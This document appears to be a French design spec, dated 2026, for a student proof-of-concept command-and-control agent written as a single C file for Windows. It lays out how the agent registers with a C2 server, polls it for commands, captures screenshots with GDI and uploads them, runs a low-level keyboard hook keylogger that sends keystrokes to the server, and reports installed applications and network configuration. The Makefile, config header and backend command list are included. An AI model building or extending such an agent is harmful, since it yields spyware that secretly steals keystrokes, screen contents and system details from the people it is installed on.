# Design — Agent C rewrite (fichier unique)

**Date :** 2026-05-26  
**Statut :** approuvé

---

## Contexte

Réécriture complète de l'agent C2 en un seul fichier C (`agent/agent.c`) en utilisant uniquement des APIs Windows système (pas de libcurl, pas de DLL tierces à distribuer). Le backend Flask existant est conservé tel quel, sauf l'ajout de `net_config` dans `ALLOWED_COMMANDS`.

---

## Fichiers

```
agent/
├── agent.c       ← tout le code
├── config.h      ← constantes (URL C2, intervalle poll)
└── Makefile
```

---

## Architecture

Un seul thread. `main()` fait :
1. Registration initiale → `POST /api/machines/report`
2. Boucle principale avec `PeekMessage` + timer de polling (3s)

### Boucle principale

```
while (1) {
    PeekMessage(...)          // requis pour WH_KEYBOARD_LL
    si timer écoulé:
        cmd = GET /command
        handle_command(cmd)
    Sleep(50)
}
```

`PeekMessage` est nécessaire pour que le hook bas niveau `WH_KEYBOARD_LL` reçoive ses callbacks. Le polling HTTP est bloquant mais court (~50ms sur LAN) — acceptable pour un POC.

---

## Modules (fonctions statiques dans agent.c)

### HTTP (WinINet)
- `http_get(url, buf, buf_sz)` → GET, remplit buf
- `http_post_json(url, json_body, resp_buf, resp_sz)` → POST JSON
- `http_post_file(url, filepath, field_name)` → POST multipart/form-data
- `http_post_raw(url, data, data_len, content_type)` → POST bytes bruts

### Infos système
- `get_hostname(buf, sz)` → `GetComputerNameA`
- `get_os_version(buf, sz)` → registre `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion` (CurrentBuildNumber + ProductName)

### Réseau
- `get_private_ip(buf, sz)` → `GetAdaptersInfo` (iphlpapi)
- `get_public_ip(buf, sz)` → GET `api.ipify.org` via WinINet
- `get_net_config(out_json, sz)` → `GetAdaptersInfo` : toutes les interfaces (IP, masque, gateway, DNS)

### Screenshot
- `take_screenshot(out_path)` → capture écran via GDI (`BitBlt`), sauvegarde en BMP, upload via `http_post_file`

### Keylogger
- `start_keylog()` → `SetWindowsHookEx(WH_KEYBOARD_LL, ...)`, active flag global
- `stop_keylog()` → `UnhookWindowsHookEx`, envoie buffer via `POST /keylog`, vide le buffer
- `keyboard_hook_proc(nCode, wParam, lParam)` → callback, accumule dans buffer global si actif

### Apps installées
- `get_installed_apps(out_json, sz)` → parcourt `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall` + `HKLM\SOFTWARE\WOW6432Node\...\Uninstall`, collecte `DisplayName` + `DisplayVersion`

### Dispatch
- `handle_command(machine_id, cmd)` → switch sur la commande, appelle la bonne fonction

---

## Protocole backend

| Commande         | Action agent                          | Route backend            |
|------------------|---------------------------------------|--------------------------|
| `screenshot`     | capture BMP → upload                  | `POST /upload`           |
| `start_keylog`   | installe hook, ack                    | `POST /result` ("ok")    |
| `stop_keylog`    | désinstalle hook + envoie buffer      | `POST /keylog`           |
| `apps`           | liste registre → JSON                 | `POST /result`           |
| `net_config`     | config interfaces → JSON              | `POST /result`           |

### Registration payload
```json
{
  "hostname": "DESKTOP-XXX",
  "os_info": "Windows 11 Pro 22621",
  "private_ip": "192.168.1.42",
  "public_ip": "1.2.3.4"
}
```
Réponse : `{"id": 3}` → stocké dans `machine_id` global.

---

## Modification backend requise

Dans `server/backend/routes/machines.py`, ajouter `'net_config'` à `ALLOWED_COMMANDS` :

```python
ALLOWED_COMMANDS = {
    'screenshot', 'start_keylog', 'stop_keylog',
    'apps', 'net_config',
    'files:Documents', 'files:Images', 'files:Videos', 'files:Bureau',
}
```

---

## Compilation (Makefile)

```makefile
CC = x86_64-w64-mingw32-gcc
CFLAGS = -Wall -O2
LIBS = -lwininet -liphlpapi -lgdi32 -lws2_32

agent.exe: agent.c
    $(CC) $(CFLAGS) agent.c -o agent.exe $(LIBS)
```

Toutes les libs sont des DLLs système Windows — présentes sur toute machine Windows, rien à distribuer.

---

## Constantes (config.h)

```c
#define C2_HOST        "192.168.1.100"
#define C2_PORT        5000
#define POLL_INTERVAL_MS  3000
#define KEYLOG_BUF_SIZE   65536
```

---

## Limites acceptées (POC étudiant)

- Pas de chiffrement des communications
- Pas d'obfuscation
- Le polling HTTP bloque brièvement la boucle de messages (~50ms max)
- Le buffer keylog est en mémoire (perdu si l'agent crash avant stop_keylog)
- BMP non compressé = fichiers lourds (résolution complète)
